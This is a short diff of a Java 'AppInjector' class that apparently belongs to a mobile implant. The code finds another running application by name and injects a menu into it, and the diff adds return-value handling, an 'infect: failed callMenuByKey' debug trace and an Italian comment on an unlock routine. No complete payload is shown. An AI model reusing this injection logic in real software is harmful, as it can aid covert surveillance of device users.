@@ -71,8 +71,8 @@ public class AppInjector {
 
                 if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
                     //MemoryCleanerDaemon.cleanAll();
-                    delegate.callMenuByKey();
-                    break;
+                    return delegate.callMenuByKey();
+                   
                 }
             }
         }
@@ -148,7 +148,11 @@ public class AppInjector {
                 Utils.sleep(200);
                 delegate.injectMenu();
                 Utils.sleep(200);
-                callMenuByKey();
+                if(!callMenuByKey()){
+                    //#ifdef DEBUG
+                    debug.trace("infect: failed callMenuByKey");
+                    //#endif;
+                }
                 Utils.sleep(200);
             } catch (Exception ex) {
                 //#ifdef DEBUG
@@ -164,6 +168,9 @@ public class AppInjector {
         }
     }
 
+    /**
+     * verifica se occorre procedere con l'unlock.
+     */
     private void unLock() {
         manager.requestForegroundForConsole();
         Utils.sleep(200);
